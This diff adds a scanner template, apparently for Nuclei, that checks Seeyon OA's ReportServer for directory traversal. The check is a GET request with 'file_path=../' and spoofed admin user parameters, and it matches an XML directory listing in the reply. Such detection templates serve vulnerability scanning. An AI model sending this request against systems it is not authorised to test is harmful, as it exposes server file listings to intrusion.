@@ -1,0 +1,26 @@
+id: seeyon-oa-reportserver-dir-traversal
+
+info:
+  name: Seeyon OA ReportServer Directory Traversal
+  author: seeyon
+  severity: high
+  tags: seeyon
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+          - "<NODES "
+          - "</NODES>"
+        condition: and
